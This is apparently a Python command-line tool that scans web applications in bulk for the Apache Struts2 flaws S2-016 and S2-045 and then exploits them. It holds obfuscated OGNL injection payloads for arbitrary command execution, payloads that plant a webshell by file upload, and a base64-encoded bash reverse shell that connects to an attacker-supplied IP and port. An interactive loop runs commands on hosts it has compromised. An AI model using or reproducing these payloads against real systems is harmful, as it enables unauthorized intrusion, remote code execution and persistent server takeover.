# coding=UTF-8

import shlex
import random
import base64
import copy
import os
import hashlib
import string
import click
import requests
from requests.exceptions import ChunkedEncodingError, ConnectionError, ConnectTimeout
from urllib.parse import quote, unquote
from functools import partial
from concurrent import futures

__title__ = 'Struts2 Tool'
__version__ = '1.0'

default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
}

# 全局代理
proxies = None
# 超时时间
_timeout = 10
# 默认输出所有结果，包括不存在漏洞的
is_quiet = False
# 进程数
process = 10
# cookie
_cookie = {}

def get(url, headers=None, encoding='UTF-8'):
    """GET请求发送包装"""
    try:
        html = requests.get(url, headers=headers, proxies=proxies, cookies=_cookie, timeout=_timeout)
        html = html.content.decode(encoding)
        return html.replace('\x00', '').strip()
    except ChunkedEncodingError as e:
        html = get_stream(url, headers, encoding)
        return html
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)


def get_stream(url, headers=None, encoding='UTF-8'):
    """分块接受数据"""
    try:
        lines = requests.get(url, headers=headers, timeout=_timeout, stream=True, proxies=proxies, cookies=_cookie)
        html = list()
        for line in lines.iter_lines():
            if b'\x00' in line:
                break
            line = line.decode(encoding)
            html.append(line.strip())
        return '\r\n'.join(html).strip()
    except ChunkedEncodingError as e:
        return '\r\n'.join(html).strip()
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)


def post(url, data=None, headers=None, encoding='UTF-8', files=None):
    """POST请求发送包装"""
    try:
        html = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=_timeout, files=files, cookies=_cookie,)
        html = html.content.decode(encoding)
        return html.replace('\x00', '').strip()
    except ChunkedEncodingError as e:
        html = post_stream(url, data, headers, encoding, files)
        return html
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)


def post_stream(url, data=None, headers=None, encoding='UTF-8', files=None):
    """分块接受数据"""
    try:
        lines = requests.post(url, data=data, headers=headers, timeout=_timeout, stream=True, proxies=proxies, cookies=_cookie, files=None)
        html = list()
        for line in lines.iter_lines():
            line = line.decode(encoding)
            html.append(line.strip())
        return '\r\n'.join(html).strip()
    except ChunkedEncodingError as e:
        return '\r\n'.join(html).strip()
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)

def parse_cmd(cmd, type='string'):
    """命令解析，将要执行的命令解析为字符串格式"""
    cmd = shlex.split(cmd)
    if type == 'string':
        cmd_str = '"' + '","'.join(cmd) + '"'
    elif type == 'xml':
        cmd_str = '<string>' + '</string><string>'.join(cmd) + '</string>'
    else:
        cmd_str = cmd
    return cmd_str


def parse_headers(headers):
    """将headers字符串解析为字典"""
    if not headers:
        return default_headers
    new_headers = copy.deepcopy(default_headers)
    headers = headers.split('&')
    for header in headers:
        header = header.split(':')
        new_headers[header[0].strip()] = header[1].strip()
    return new_headers


def get_hash():
    """获取随机字符串"""
    letters = string.ascii_letters
    rand = ''.join(random.sample(letters, 10))
    hash = hashlib.md5(rand.encode()).hexdigest()
    return hash


def echo_check(self):
    """通过echo输出检查漏洞是否存在"""
    hash_str = get_hash(); html = self.exec_cmd("echo " + hash_str)
    if hash_str in html:
        return True
    else:
        return False


def reverse_shell(self, ip, port):
    """反弹shell"""
    cmd = "bash -i >& /dev/tcp/{ip}/{port} 0>&1".format(ip=ip, port=port)
    cmd = base64.b64encode(cmd.encode()).decode()
    shell = self.shell.replace('SHELL', cmd)
    html = self.exec_cmd(shell)
    return html


def check_file(file_path):
    """检查文件是否存在"""
    if os.path.exists(file_path):
        return True
    else:
        click.secho("[ERROR] {file}文件不存在!".format(file=file_path), fg='red')
        exit(0)


def read_file(file_path, encoding='UTF-8'):
    """读文件，默认使用UTF-8编码"""
    if check_file(file_path):
        with open(file_path, 'r', encoding=encoding) as f:
            data = f.read()
        return data


def read_urls(file):
    """读取URL文件"""
    if check_file(file):
        with open(file, 'r', encoding='UTF-8') as f:
            urls = f.readlines()
        urls = [url.strip() for url in urls if url and url.strip()]
        return urls


def check_int(name, t):
    """检查int变量"""
    try:
        t = int(t)
        return t
    except Exception as e:
        click.secho("[ERROR] 参数{name}必须为整数!".format(name=name), fg='red')
        exit(0)

def parse_cookie(cookies):
    """解析cookies,将所有cookie的键值对以字典的形式返回,cookie之间以；分隔"""
    cookie = cookies.split(chr(59))
    cookieDit = {}
    for i in range(len(cookie)):
        cookie_split = cookie[i].split(chr(61))
        cookie_key = cookie_split[0]
        cookie_value = cookie_split[1]
        cookieDit = dict(cookieDit, **{cookie_key:cookie_value})
    return cookieDit


class S2_016:
    """S2-016漏洞检测利用类"""
    info = "[+] S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传"
    check_poc = "redirect%3A%24%7B{num1}%2B{num2}%7D"
    web_path = "redirect:$%7B%23a%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
    exec_payload1 = r"""redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27CMD%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}"""
    exec_payload2 = "redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D"
    upload_payload1 = r"""redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23res%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22PATH%22)).append(%23req.getParameter(%22t%22)).close()}&t=SHELL"""
    upload_payload2 = "redirect%3A%24%7B%23context%5B%22xwor%22%2b%22k.Meth%22%2b%22odAcce%22%2b%22ssor.denyMet%22%2b%22hodEx%22%2b%22ecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allo%22%2b%22wStat%22%2b%22icMet%22%2b%22hodAc%22%2b%22cess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22co%22%2b%22m.open%22%2b%22symphony.xwo%22%2b%22rk2.disp%22%2b%22atcher.HttpSer%22%2b%22vletReq%22%2b%22uest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%22{path}%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22co%22%2b%22m.open%22%2b%22symphony.xwo%22%2b%22rk2.disp%22%2b%22atcher.HttpSer%22%2b%22vletRes%22%2b%22ponse%22).getWriter()%2C%23genxor.println(%22OK%22)%2C%23genxor.flush()%2C%23genxor.close()%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        self.data = data
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.format(num1=num1, num2=num2)
        html = get(self.url + '?' + poc, self.headers, self.encoding)
        nn = str(num1 + num2)
        if nn in html:
            self.is_vul = True
            return 'S2-016'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = get(self.url + "?" + self.web_path, self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        exec_payload = self.exec_payload1.replace('CMD', cmd)
        html = post(self.url, exec_payload, self.headers, self.encoding)
        return html

    def exec_cmd2(self, cmd):
        """执行命令"""
        cmd = parse_cmd(cmd)
        html = get(self.url + "?" + self.exec_payload2.format(cmd=quote(cmd)), self.headers,
                   self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        cmd = "bash -i >& /dev/tcp/{ip}/{port} 0>&1".format(ip=ip, port=port)
        cmd = base64.b64encode(cmd.encode()).decode()
        shell = self.shell.replace('SHELL', cmd)
        html = self.exec_cmd2(shell)
        return html

    def upload_shell1(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = self.upload_payload1.replace('PATH', quote(upload_path)).replace('SHELL', quote(shell))
        html = post(self.url, data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False

    def upload_shell2(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = "t=" + quote(shell)
        web_path = self.get_path()
        upload_path = upload_path.replace(web_path, '')
        html = post(self.url + '?' + self.upload_payload2.format(path=upload_path), data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False

    def upload_shell(self, upload_path, shell_path):
        result = self.upload_shell1(upload_path, shell_path)
        if not result:
            result = self.upload_shell2(upload_path, shell_path)
        return result


class S2_045:
    """S2-045漏洞检测利用类"""
    info = "[+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传"
    web_path = r"""%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.Ac'+'tionCo'+'nte'+'xt.co'+'ntainer']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("/"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""
    exec_payload = r"""%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.Ac'+'tionCo'+'nte'+'xt.co'+'ntainer']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='CMD').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""
    upload_payload = r"""%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.Ac'+'tionCo'+'nte'+'xt.co'+'ntainer']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#fos= new java.io.FileOutputStream(#req.getParameter("f")),#fos.write(#req.getParameter("t").getBytes()),#fos.close()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println("OK"),(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())))}"""
    shell = "{echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8",):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.data = data
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if html:
            self.is_vul = True
            return 'S2-045'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        self.headers['Content-Type'] = self.web_path
        html = post(self.url, self.data, self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        self.headers['Content-Type'] = self.exec_payload.replace('CMD', cmd)
        html = post(self.url, self.data, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html

    def upload_shell(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = "?t={shell}&f={path}".format(shell=quote(shell), path=upload_path)
        self.headers['Content-Type'] = self.upload_payload
        html = post(self.url + data, self.data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False


# 所有漏洞名称
s2_dict = {'S2_016': S2_016, 'S2_045': S2_045}
# 支持漏洞扫描和检查
s2_list = [S2_016, S2_045]
# 支持获取WEB路径的漏洞名称列表
webpath_names = ["S2_016", "S2_045"]
# 支持命令执行的漏洞名称列表
exec_names = ["S2_016", "S2_045"]
# 支持反弹shell的漏洞名称列表
reverse_names = ["S2_016", "S2_045"]
# 支持文件上传的漏洞名称列表
upload_names = ["S2_016", "S2_045"]

banner = """
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

                            Struts2-Tool

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

"""

def show_info():
    """漏洞详情介绍"""
    click.secho("[+] 支持如下Struts2漏洞:", fg='red')
    for k, v in s2_dict.items():
        click.secho(v.info, fg='green')


def scan_one(url, data=None, headers=None, encoding="UTF-8"):
    """扫描单个URL漏洞"""
    click.secho('[+] 正在扫描URL:' + url, fg='green')
    ss = [s(url, data, headers, encoding) for s in s2_list]
    results = []
    for i in range(len(ss)):
        results.append(ss[i].check())
    results = {r for r in results if r}
    click.secho('[*] ----------------results------------------'.format(url=url), fg='green')
    if (not results) and (not is_quiet):
        click.secho('[*] {url} 未发现漏洞'.format(url=url), fg='red')
    for r in results:
        click.secho('[*] {url} 存在漏洞: {name}'.format(url=url, name=r), fg='red')


def scan_more(urls, data=None, headers=None, encoding="UTF-8"):
    """批量扫描URL"""
    scan = partial(scan_one, data=data, headers=headers, encoding=encoding)
    with futures.ProcessPoolExecutor(max_workers=process) as executor:
        results = list(executor.map(scan, urls))
    return results


CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])


@click.command(context_settings=CONTEXT_SETTINGS)
@click.option('-i', '--info', is_flag=True, help="漏洞信息介绍")
@click.option('-v', '--version', is_flag=True, help="显示工具版本")
@click.option('-u', '--url', help="URL地址")
@click.option('-n', '--name', help="指定漏洞名称, 漏洞名称详见info")
@click.option('-f', '--file', help="批量扫描URL文件, 一行一个URL")
@click.option('-d', '--data', help="POST参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp}")
@click.option('-c', '--encode', default="UTF-8", help="页面编码, 默认UTF-8编码")
@click.option('-p', '--proxy', help="HTTP代理. 格式为http://ip:port")
@click.option('-t', '--timeout', help="HTTP超时时间, 默认10s")
@click.option('-w', '--workers', help="批量扫描进程数, 默认为10个进程")
@click.option('--header', help="HTTP请求头, 格式为: key1=value1&key2=value2")
@click.option('-e', '--exec', is_flag=True, help="进入命令执行shell")
@click.option('--webpath', is_flag=True, help="获取WEB路径")
@click.option('-r', '--reverse', help="反弹shell地址, 格式为ip:port")
@click.option('--upfile', help="需要上传的文件路径和名称")
@click.option('--uppath', help="上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp")
@click.option('-q', '--quiet', is_flag=True, help="关闭打印不存在漏洞的输出，只保留存在漏洞的输出")
@click.option('-k', '--cookies', help="目标页面需要的cookies, cookies的输入格式为key1=value1;key2=value2;...")
def main(info, version, url, file, name, data, header, encode, proxy, exec, reverse, upfile, uppath, quiet, timeout,
         workers, webpath, cookies):
    """Struts2批量扫描利用工具"""
    global proxies, is_quiet, _timeout, process, _cookie
    click.secho(banner, fg='red')
    if not encode:
        encode = 'UTF-8'
    if info:
        show_info()
        exit(0)
    if version:
        click.secho("[+] Struts2_tool V1.0", fg='green')
        exit(0)
    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy
        }
    if cookies:
        _cookie = parse_cookie(cookies)
    if quiet:
        is_quiet = True
    if timeout and check_int('timeout', timeout):
        _timeout = check_int('timeout', timeout)
    if workers and check_int('workers', workers):
        process = check_int('workers', workers)
    if url and not name:
        scan_one(url, data, header, encode)
    if file:
        urls = read_urls(file)
        scan_more(urls, data, header, encode)
    if name and url:
        # 指定漏洞利用
        name = name.upper().replace('-', '_')
        if name not in s2_dict:
            click.secho("[ERROR] 暂不支持{name}漏洞利用".format(name=name), fg="red")
            exit(0)
        s = s2_dict[name](url, data, header, encode)
        if webpath:
            if name in webpath_names:
                web_path = s.get_path()
                click.secho("[*] {webpath}".format(webpath=web_path), fg="red")
                exit(0)
            else:
                click.secho("[ERROR] 漏洞{name}不支持获取WEB路径".format(name=name), fg="red")
                exit(0)
        if reverse:
            if name in reverse_names:
                click.secho("[*] 请在反弹地址处监听端口如: nc -lvvp 8080", fg="red")
                if ':' not in reverse:
                    click.secho("[ERROR] reverse反弹地址格式不对,正确格式为: 192.168.1.10:8080", fg="red")
                ip = reverse.split(':')[0].strip()
                port = reverse.split(':')[1].strip()
                s.reverse_shell(ip, port)
                exit(0)
            else:
                click.secho("[ERROR] 漏洞{name}不支持反弹shell".format(name=name), fg="red")
                exit(0)
        if upfile and uppath:
            if name in upload_names and check_file(upfile):
                result = s.upload_shell(uppath, upfile)
                if result is True:
                    click.secho("[+] 文件上传成功!", fg="green")
                    exit(0)
                elif str(result).startswith("ERROR:"):
                    click.secho("[ERROR] 文件上传失败! {error}".format(error=result[6:]), fg="red")
                    exit(0)
                else:
                    click.secho("[ERROR] 文件上传失败! \n{error}".format(error=result), fg="red")
                    exit(0)
            else:
                click.secho("[ERROR] 漏洞{name}不支持文件上传".format(name=name), fg="red")
                exit(0)
        if exec:
            if name in exec_names:
                while True:
                    cmd = input('>>>')
                    result = s.exec_cmd(cmd)
                    click.secho(result, fg='red')
            else:
                click.secho("[ERROR] 漏洞{name}不支持命令执行".format(name=name), fg="red")
                exit(0)
        click.secho(s.info, fg='green')
        exit(0)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt as e:
        exit(0)
    except Exception as e:
        click.secho("[ERROR] {error}".format(error=e), fg='red')
        exit(0)
